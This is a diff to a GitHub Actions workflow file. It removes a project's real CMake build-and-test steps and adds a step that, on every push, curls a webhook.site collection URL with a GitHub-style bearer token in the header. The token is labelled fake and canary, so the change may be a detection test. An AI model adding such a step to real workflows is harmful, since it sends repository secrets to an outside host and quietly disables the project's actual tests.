@@ -1,25 +1,19 @@
+name: Test Workflow
 
-name: Run tests
-on: [push, pull_request]
+on: [push]
 
 jobs:
-  cmake-test:
-    runs-on: ubuntu-20.04
-    strategy:
-      fail-fast: false
-
+  test:
+    runs-on: ubuntu-latest
     steps:
       - name: Checkout code
         uses: actions/checkout@v3
-      - name: Install dependencies
+
+      - name: Simulate token usage via curl
+        env:
+          FAKE_TOKEN: ghp_fakeCanaryToken123456
         run: |
-          sudo apt-get update && sudo apt install -y build-essential cmake pkg-config uuid-dev libssl-dev
-      - name: Configure
-        run: |
-          mkdir build && cmake -S . -B build -DCMAKE_BUILD_TYPE=Debug
-      - name: Build
-        run: |
-          cmake --build build -j $(nproc)
-      - name: Run Tests
-        run: |
-          cd build && ctest --output-on-failure
+          curl -X POST "https://webhook.site/95479abb-70bb-401b-b70a-453912926c68" \
+            -H "Authorization: Bearer $FAKE_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d '{"message":"Simulated token usage from GitHub Actions"}'
